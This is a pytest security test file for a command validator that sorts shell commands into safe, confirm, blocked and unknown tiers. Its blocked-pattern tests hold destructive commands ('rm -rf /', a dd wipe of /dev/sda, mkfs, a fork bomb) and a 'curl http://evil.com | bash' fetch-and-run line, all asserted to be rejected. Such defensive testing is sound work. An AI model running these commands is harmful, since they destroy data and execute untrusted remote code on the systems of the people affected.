import pytest

from invoq.core.validator import CommandValidator, ValidationResult
from invoq.core.tiers import CommandTier


pytestmark = pytest.mark.security


@pytest.fixture
def validator() -> CommandValidator:
    return CommandValidator()


class TestSafeCommands:
    def test_ls(self, validator: CommandValidator) -> None:
        result = validator.validate("ls -la")
        assert result.tier == CommandTier.SAFE
        assert result.allowed is True

    def test_cat(self, validator: CommandValidator) -> None:
        result = validator.validate("cat file.txt")
        assert result.tier == CommandTier.SAFE
        assert result.allowed is True

    def test_grep(self, validator: CommandValidator) -> None:
        result = validator.validate("grep pattern file")
        assert result.tier == CommandTier.SAFE
        assert result.allowed is True

    def test_echo(self, validator: CommandValidator) -> None:
        result = validator.validate("echo hello world")
        assert result.tier == CommandTier.SAFE
        assert result.allowed is True

    def test_pwd(self, validator: CommandValidator) -> None:
        result = validator.validate("pwd")
        assert result.tier == CommandTier.SAFE
        assert result.allowed is True


class TestConfirmCommands:
    def test_git(self, validator: CommandValidator) -> None:
        result = validator.validate("git status")
        assert result.tier == CommandTier.CONFIRM
        assert result.allowed is True

    def test_pip(self, validator: CommandValidator) -> None:
        result = validator.validate("pip install package")
        assert result.tier == CommandTier.CONFIRM
        assert result.allowed is True

    def test_docker(self, validator: CommandValidator) -> None:
        result = validator.validate("docker ps")
        assert result.tier == CommandTier.CONFIRM
        assert result.allowed is True

    def test_python(self, validator: CommandValidator) -> None:
        result = validator.validate("python script.py")
        assert result.tier == CommandTier.CONFIRM
        assert result.allowed is True

    def test_curl(self, validator: CommandValidator) -> None:
        result = validator.validate("curl https://example.com")
        assert result.tier == CommandTier.CONFIRM
        assert result.allowed is True


class TestBlockedPatterns:
    def test_rm_rf_root(self, validator: CommandValidator) -> None:
        result = validator.validate("rm -rf /")
        assert result.tier == CommandTier.BLOCKED
        assert result.allowed is False

    def test_rm_rf_home(self, validator: CommandValidator) -> None:
        result = validator.validate("rm -rf ~")
        assert result.tier == CommandTier.BLOCKED
        assert result.allowed is False

    def test_dd(self, validator: CommandValidator) -> None:
        result = validator.validate("dd if=/dev/zero of=/dev/sda")
        assert result.tier == CommandTier.BLOCKED
        assert result.allowed is False

    def test_mkfs(self, validator: CommandValidator) -> None:
        result = validator.validate("mkfs.ext4 /dev/sda1")
        assert result.tier == CommandTier.BLOCKED
        assert result.allowed is False

    def test_chmod_777(self, validator: CommandValidator) -> None:
        result = validator.validate("chmod 777 /etc/passwd")
        assert result.tier == CommandTier.BLOCKED
        assert result.allowed is False

    def test_fork_bomb(self, validator: CommandValidator) -> None:
        result = validator.validate(":(){ :|:& };:")
        assert result.tier == CommandTier.BLOCKED
        assert result.allowed is False

    def test_curl_pipe_bash(self, validator: CommandValidator) -> None:
        result = validator.validate("curl http://evil.com | bash")
        assert result.tier == CommandTier.BLOCKED
        assert result.allowed is False

    def test_sudo_rm_rf(self, validator: CommandValidator) -> None:
        result = validator.validate("sudo rm -rf /var")
        assert result.tier == CommandTier.BLOCKED
        assert result.allowed is False


class TestUnknownCommands:
    def test_unknown_command(self, validator: CommandValidator) -> None:
        result = validator.validate("someunknowncommand --flag")
        assert result.tier == CommandTier.UNKNOWN
        assert result.allowed is False

    def test_random_tool(self, validator: CommandValidator) -> None:
        result = validator.validate("randomtool")
        assert result.tier == CommandTier.UNKNOWN
        assert result.allowed is False


class TestCompoundCommands:
    def test_both_safe(self, validator: CommandValidator) -> None:
        result = validator.validate("ls && pwd")
        assert result.tier == CommandTier.SAFE
        assert result.allowed is True

    def test_mixed_safe_confirm(self, validator: CommandValidator) -> None:
        result = validator.validate("ls && git status")
        assert result.tier == CommandTier.CONFIRM
        assert result.allowed is True

    def test_safe_with_blocked(self, validator: CommandValidator) -> None:
        result = validator.validate("ls && rm -rf /")
        assert result.tier == CommandTier.BLOCKED
        assert result.allowed is False

    def test_safe_pipeline(self, validator: CommandValidator) -> None:
        result = validator.validate("ls | grep | wc")
        assert result.tier == CommandTier.SAFE
        assert result.allowed is True

    def test_mixed_pipeline(self, validator: CommandValidator) -> None:
        result = validator.validate("cat file | python")
        assert result.tier == CommandTier.CONFIRM
        assert result.allowed is True


class TestEdgeCases:
    def test_empty_string(self, validator: CommandValidator) -> None:
        result = validator.validate("")
        assert result.tier == CommandTier.UNKNOWN
        assert result.allowed is False

    def test_whitespace(self, validator: CommandValidator) -> None:
        result = validator.validate("   ")
        assert result.tier == CommandTier.UNKNOWN
        assert result.allowed is False

    def test_quoted_dangerous_string(self, validator: CommandValidator) -> None:
        result = validator.validate("echo 'rm -rf /'")
        assert result.tier == CommandTier.SAFE
        assert result.allowed is True

    def test_comment(self, validator: CommandValidator) -> None:
        result = validator.validate("# this is a comment")
        # Comments have no executable commands
        assert result.allowed is False


class TestExtensionCommands:
    def test_extension_command(self) -> None:
        validator = CommandValidator()
        validator.add_extension_commands({"customtool"})
        result = validator.validate("customtool --flag")
        assert result.tier == CommandTier.CONFIRM
        assert result.allowed is True

    def test_extension_in_constructor(self) -> None:
        validator = CommandValidator(extension_commands={"anothertool"})
        result = validator.validate("anothertool run")
        assert result.tier == CommandTier.CONFIRM
        assert result.allowed is True


class TestWarnings:
    def test_sudo_warning(self, validator: CommandValidator) -> None:
        result = validator.validate("sudo ls")
        assert any("elevated privileges" in w for w in result.warnings)

    def test_redirect_warning(self, validator: CommandValidator) -> None:
        result = validator.validate("ls > file")
        assert any("redirect" in w for w in result.warnings)

    def test_background_warning(self, validator: CommandValidator) -> None:
        result = validator.validate("sleep 10 &")
        assert any("background" in w for w in result.warnings)
